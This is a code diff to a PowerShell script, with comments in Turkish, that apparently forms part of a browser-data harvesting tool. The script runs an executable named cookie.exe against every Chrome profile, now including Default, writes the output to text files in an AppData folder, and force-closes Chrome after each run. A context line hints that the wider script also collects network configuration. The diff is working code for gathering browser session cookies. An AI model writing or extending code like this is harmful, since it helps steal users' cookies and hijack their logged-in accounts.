@@ -309,46 +309,52 @@ Write-Host "Network configuration saved."
 
 # Function to run cookie.exe, open Chrome with different profiles, and close Chrome after
 function RunCookieExe {
-    $cookieExePath = Join-Path -Path "$env:APPDATA\BrowserData\Chrome" -ChildPath "cookie.exe"
-    $chromeUserDataPath = Join-Path -Path "$env:LOCALAPPDATA\Google\Chrome\User Data"
-    
-    # Function to start Chrome with a specified profile and run cookie.exe
+    # cookie.exe'nin ve Chrome kullanıcı verisi dizinlerinin yolunu belirleyin
+    $cookieExePath = "$env:APPDATA\BrowserData\Chrome\cookie.exe"
+    $chromeUserDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+
+    # cookie.exe'nin varlığını kontrol edin
+    if (!(Test-Path -Path $cookieExePath)) {
+        Write-Host "cookie.exe not found at $cookieExePath. Please check the path."
+        return
+    }
+
+    # Chrome'u belirli bir profil ile başlatmak ve cookie.exe'yi çalıştırmak için bir fonksiyon tanımlayın
     function StartChromeAndRunCookie {
         param (
             [string]$profileDir,
             [string]$outputPath
         )
 
-        # Start Chrome with the specified profile
-        start chrome --profile-directory=$profileDir
-        Start-Sleep -Seconds 3 # Wait for Chrome to open (you can adjust the sleep time)
+        # Chrome'u belirtilen profil ile başlatın (profile name içinde tırnaklarla)
+        start chrome --profile-directory="`"$profileDir`""
+        Start-Sleep -Seconds 3 # Chrome'un açılmasını bekleyin
         Write-Host "Chrome opened with profile: $profileDir"
 
-        # Run cookie.exe and save output
-        if (Test-Path $cookieExePath) {
-            $cookieCommand = & $cookieExePath 2>&1
-            $cookieCommand | Out-File -FilePath $outputPath
-            Write-Host "Output saved to: $outputPath"
-        } else {
-            Write-Host "cookie.exe not found."
-        }
+        # cookie.exe'yi çalıştırın ve çıktıyı kaydedin
+        $cookieCommand = & $cookieExePath 2>&1
+        $cookieCommand | Out-File -FilePath $outputPath
+        Write-Host "Output saved to: $outputPath"
 
-        # Close Chrome after executing cookie.exe
+        # cookie.exe çalıştırıldıktan sonra Chrome'u kapatın
         Stop-Process -Name "chrome" -Force
         Write-Host "Chrome closed."
     }
 
-    # Loop through all Profile {number} directories
-    Get-ChildItem -Path $chromeUserDataPath -Directory | Where-Object { $_.Name -match '^Profile \d+$' } | ForEach-Object {
-        $profileDir = $_.Name
-        $outputPath = Join-Path -Path "$env:APPDATA\BrowserData\Chrome" -ChildPath "cookie_output_$profileDir.txt"
-        
-        # Run StartChromeAndRunCookie for each profile
+    # Default profili ve Profile {sayı} klasörlerini içeren tüm dizinleri alın
+    $profiles = Get-ChildItem -Path $chromeUserDataPath -Directory | Where-Object { $_.Name -match '^(Default|Profile \d+)$' }
+
+    # Her profil için işlemi çalıştırın
+    foreach ($profile in $profiles) {
+        $profileDir = $profile.Name
+        $outputPath = "$env:APPDATA\BrowserData\Chrome\cookie_output_$profileDir.txt"
+
+        # Her profil için StartChromeAndRunCookie fonksiyonunu çalıştırın
         StartChromeAndRunCookie -profileDir $profileDir -outputPath $outputPath
     }
 }
 
-# Call the function after other operations
+# Fonksiyonu çalıştır
 RunCookieExe
 
 
